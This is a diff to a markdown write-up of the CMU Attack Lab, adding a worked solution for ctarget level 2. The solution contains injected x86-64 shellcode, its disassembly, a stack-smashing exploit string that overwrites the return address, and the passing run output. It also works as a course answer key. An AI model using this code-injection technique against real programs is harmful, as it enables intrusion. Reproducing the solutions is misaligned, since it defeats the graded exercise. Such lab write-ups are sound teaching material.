@@ -6,6 +6,11 @@
     + [Step 1. Disassemble the ctarget](#step-1-disassemble-the-ctarget)
     + [Step 2. Inspect the stack frame of *getbuf*](#step-2-inspect-the-stack-frame-of--getbuf-)
     + [Step 3. Attack the return address](#step-3-attack-the-return-address)
+  * [ctarget Level 2: Goal](#ctarget-level-2--goal)
+  * [ctarget Level 2: Solution](#ctarget-level-2--solution)
+    + [Step 1. Inspect the stack](#step-1-inspect-the-stack)
+    + [Step 2. Make a code](#step-2-make-a-code)
+    + [Step 3. Verify](#step-3-verify)
 # Lab 2: Attack Lab
 
 > *Covered Concept: Stack Frame, Buffer Overflow, Return Oriented Programming*  
@@ -143,6 +148,135 @@ Since the address of ***touch1*** is `0x4017c0`
 00 00 00 00 00 00 00 00
 c0 17 40
 ```  
-Since the machine is little endian, reverse the byte order of address.  
+Since the machine is little endian, reverse the byte order of address. 
+
+```shell=
+./hex2raw -i ansC_lv1.txt > ansC_lv1_raw.txt
+./ctarget -q -i ansC_lv1_raw.txt
+```
+
+>Cookie: 0x59b997fa
+Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 
+
+---
+
+## ctarget Level 2: Goal
+
+Phase 2 involves injecting a small amount of code as part of your exploit string.
+Within the file ctarget there is code for a function touch2 having the following C representation:
+```C
+1 void touch2(unsigned val)
+6
+2 {
+3     vlevel = 2; /* Part of validation protocol */
+4     if (val == cookie) {
+5         printf("Touch2!: You called touch2(0x%.8x)\n", val);
+6         validate(2);
+7     } else {
+8         printf("Misfire: You called touch2(0x%.8x)\n", val);
+9         fail(2);
+10    }
+11    exit(0);
+12 }
+```
+
+Your task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case, however, you must make it appear to touch2 as if you have passed your cookie as its argument. Some Advice:  
+• You will want to position a byte representation of the address of your injected code in such a way that
+ret instruction at the end of the code for getbuf will transfer control to it.
+• Recall that the first argument to a function is passed in register %rdi.
+• Your injected code should set the register to your cookie, and then use a ret instruction to transfer
+control to the first instruction in touch2.
+• Do not attempt to use jmp or call instructions in your exploit code. The encodings of destination
+addresses for these instructions are difficult to formulate. Use ret instructions for all transfers of
+control, even when you are not returning from a call.
+• See the discussion in Appendix B on how to use tools to generate the byte-level representations of instruction sequences.  
+    
+---
+## ctarget Level 2: Solution
+
+### Step 1. Inspect the stack
+Up to now, the stack is as shown:  
+    ![](https://i.imgur.com/mHK12AP.png)
+    
+Our target is to pass cookie number as an argument and transfer control to **touch2**  
+
+&rArr; We should make a code to achieve it.  
+  
+**Strategy**
+    Make a code in the stack through exploit string to pass cookie number as argument and ret to **touch2**
+  
+### Step 2. Make a code
+
+1. We should transfer the control to our code in the stack.
+    &rArr; The return address should point to the entry of our code.
+
+2. After transfer, the stack has popped the return address. Since we are roing to transfer the control to **touch2**, we should push the address of **touch2** on the stack so that the next `ret` will jump to **touch2**. 
+
+3. Pass the cookie as argument and ret.  
+
+As a result of 2, 3: 
+    
+```=
+#exploit code for ctarget level 2	
+pushq $0x4017ec  # push the addr of touch2
+movq $0x59b997fa, %rdi   # pass cookie as argument
+ret   # return to the pushed return address
+```
+
+To get the form in bytes,
+```=
+gcc -c ansC_lv2_code.s
+objdump -d ansC_lv2_code.o > ansC_lv2_code.s
+```
+We get the disassembly 
+```=
+    ./ansC_lv2.o      檔案格式 elf64-x86-64
+
+
+.text 區段的反組譯：
+
+0000000000000000 <.text>:
+   0:	68 ec 17 40 00       	push   $0x4017ec
+   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+   c:	c3                   	ret    
+```
+
+&rArr; Since the raw code contains 13 bytes, the entry of the code is 0x5561dca0 - 13 = `0x5561dc93`. We should make the return address this number.  
+
+Consequently we make a input as below (in ansC_lv2.txt):
+```=
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00
+68 ec 17 40 00
+48 c7 c7 fa 97 b9 59
+c3
+93 dc 61 55 00 00 00 00
+```
+
+### Step 3. Verify
+
+```shell=
+./hex2raw -i ansC_lv2.txt > ansC_lv2_raw.txt
+./ctarget -q -i ansC_lv2_raw.txt
+```  
+Result:
+```=
+Cookie: 0x59b997fa
+Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+	user id	bovik
+	course	15213-f15
+	lab	attacklab
+	result	1:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 93 DC 61 55 00 00 00 00
+```
 
 
